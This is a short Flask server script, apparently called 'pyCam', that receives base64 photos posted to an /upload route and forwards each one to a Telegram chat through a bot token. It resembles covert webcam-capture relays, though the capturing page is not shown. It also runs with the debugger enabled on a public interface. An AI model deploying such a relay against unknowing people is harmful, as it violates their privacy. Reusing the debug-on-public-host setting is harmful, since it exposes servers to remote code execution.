from flask import Flask, request, jsonify, render_template
import os
import base64
import logging
import requests
from dotenv import load_dotenv
load_dotenv()

app = Flask(__name__)

logging.basicConfig(filename='pyCam.log', level=logging.INFO, format='%(asctime)s - %(message)s')

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

def send_to_telegram(photo_data):
    """Send photo to Telegram using the Bot API"""
    try:
        # Decode the base64 image data
        photo_bytes = base64.b64decode(photo_data.split(',')[1])
        
        # Save temporarily (optional, just for the upload)
        temp_file = 'temp_capture.jpg'
        with open(temp_file, 'wb') as f:
            f.write(photo_bytes)
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        files = {'photo': open(temp_file, 'rb')}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        
        response = requests.post(url, files=files, data=data)
        
        os.remove(temp_file)
        
        if response.status_code == 200:
            logging.info("Photo sent to Telegram successfully")
            return True
        else:
            logging.error(f"Failed to send to Telegram: {response.text}")
            return False
            
    except Exception as e:
        logging.error(f"Error sending to Telegram: {str(e)}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'photo' in request.json:
        photo_data = request.json['photo']
        
        # Send to Telegram instead of saving locally
        if send_to_telegram(photo_data):
            return jsonify({'message': 'Photo sent to Telegram successfully'}), 200
        else:
            return jsonify({'error': 'Failed to send photo to Telegram'}), 500
    
    return jsonify({'error': 'No photo data received'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc', debug=True)